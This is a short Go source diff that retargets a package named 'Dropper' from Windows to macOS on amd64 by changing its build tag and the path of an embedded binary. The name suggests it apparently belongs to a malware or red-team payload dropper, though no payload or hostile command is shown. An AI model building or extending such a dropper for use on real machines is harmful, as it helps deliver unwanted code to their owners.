@@ -1,5 +1,4 @@
-//go:build windows
-// +build windows
+//go:build darwin && amd64
 
 package Dropper
 
@@ -7,5 +6,5 @@ import (
 	_ "embed"
 )
 
-//go:embed windows
+//go:embed src/darwin-amd64
 var Dropper []byte
